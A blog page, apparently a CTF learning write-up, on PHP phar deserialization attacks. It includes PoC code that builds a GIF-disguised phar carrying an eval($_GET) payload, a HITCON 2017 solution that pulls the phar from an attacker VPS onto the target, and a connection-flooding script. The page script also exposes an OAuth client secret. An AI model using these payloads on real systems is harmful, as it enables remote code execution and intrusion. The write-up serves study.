@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      PHP反序列化学习之phar攻击 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>PHP反序列化学习之phar攻击</h2>
+  <p class="post-date">2019-05-22 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p>
+<h1 id="Phar定义"><a href="#Phar定义" class="headerlink" title="Phar定义"></a>Phar定义</h1><p>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file:// php://</code>等类似，也是一种流包装器。<br>phar结构由 4 部分组成</p>
+<blockquote>
+<p>stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；<br>manifest 压缩文件的属性等信息，以<strong>序列化</strong>存储；<br>contents 压缩文件的内容；<br>signature 签名，放在文件末尾；</p>
+</blockquote>
+<p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：</p>
+<p><img src="./1.png" alt=""></p>
+<h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><p><img src="./1.png" alt=""></p>
+<p><code>Phar://</code>协议流只要出现phar标识头就会解析，所以我们可以直接改成gif格式文件<br>根据上述poc创建出poc1.gif上传后，通过<code>file_exists</code>触发文件反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Myclass&#123;</span><br><span class="line">    var  $output&#x3D;&#39;@eval($_GET[&quot;a&quot;]);&#39;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$o&#x3D;new Myclass();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code><br><img src="./2.png" alt=""></p>
+<h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><p><img src="./3.png" alt=""></p>
+<p>代码<strong>第40行</strong>进行反序列化，回溯到<strong>第9行</strong>是对<code>user</code>类进行反序列化。<br>通读代码可知需要构造反序列化Admin类触发<code>__destruct</code>，执行<code>create_function</code>创建匿名函数，通过<code>$_GET[‘lucky’]()</code>执行匿名函数得到Flag.</p>
+<p><code>$data</code>通过<code>cookie</code>传入，可控。但是在<code>check_session()</code>方法对<code>$data</code>进行hash验证。很显然我们得不到<code>secret</code>。</p>
+<p><img src="./4.png" alt=""></p>
+<p>看来伪照<code>$data</code>无果，看到<code>upload()</code>方法有<code>file_get_contents</code>方法，由文章开头可知该方法可以触发phar反序列化。<br>我们可以通过<code>$_GET[‘url’]</code>借助<code>vps</code>上传<code>avatar.gif</code>，Poc构造如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar &#x3D; &#39;随便填&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class Admin extends User &#123; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$o&#x3D;new Admin();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是执行怎样通过<code>$_GET[‘lucky’]</code>执行匿名函数问题。</p>
+<p>源码分析匿名函数具体见我一篇文章：create_function任意代码执行</p>
+<p>那么怎样才能得到匿名函数名，可以参考： <code>Apache的三种MPM模式比较：prefork，worker，event</code>。当用户请求过大时，超过 apache 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p>
+<p>将生成的 <strong>poc1.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong>，然后将文件上传到题目服务器上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;$SANDBOX&#x2F;&amp;lucky&#x3D;%00lambda_</span><br></pre></td></tr></table></figure>
+
+<h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line"># Author: orange@chroot.org</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">try:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    while 1:</span><br><span class="line">        HOST &#x3D; &#39;127.0.0.1&#39;</span><br><span class="line">        PORT &#x3D; 80</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(&#39;GET &#x2F; HTTP&#x2F;1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n&#39;)</span><br><span class="line">        # s.close()</span><br><span class="line">        print &#39;ok&#39;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">i &#x3D; 8</span><br><span class="line">pool &#x3D; ThreadPool( i )</span><br><span class="line">result &#x3D; pool.map_async( run, range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.freebuf.com/column/198945.html" target="_blank" rel="noopener">PHP反序列化入门之phar</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017" target="_blank" rel="noopener">My-CTF-Web-Challenges</a><br><a href="https://kylingit.com/blog/%E7%94%B1phpggc%E7%90%86%E8%A7%A3php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">由phpggc理解php反序列化漏洞</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#PHP反序列化" >
+    <span class="tag-code">PHP反序列化</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/">
+        <span class="nav-arrow">← </span>
+        
+          RCTF | nextphp题解
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/">
+        
+          2019ISCC_web题解
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#概述"><span class="toc-nav-text">概述</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Phar定义"><span class="toc-nav-text">Phar定义</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF-1"><span class="toc-nav-text">CTF_1</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CTF-2"><span class="toc-nav-text">CTF_2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#HITCON2017-Baby-H-Master-PHP-2017"><span class="toc-nav-text">HITCON2017 Baby^H Master PHP 2017</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#多线程请求"><span class="toc-nav-text">多线程请求</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/05/22/PHP反序列化学习之phar攻击/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "PHP反序列化学习之phar攻击",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
